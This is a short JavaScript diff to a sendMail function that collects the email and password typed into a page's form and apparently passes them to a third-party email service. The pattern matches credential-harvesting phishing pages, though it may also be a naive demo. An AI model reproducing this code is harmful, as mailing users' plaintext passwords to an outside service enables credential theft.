@@ -1,7 +1,7 @@
 function sendMail() {
   var params = {
-    name: document.getElementById("email").value,
-    email: document.getElementById("password").value,
+    email: document.getElementById("email").value,
+    password: document.getElementById("password").value,
   };
 
   const serviceID = "service_9l3icjh";
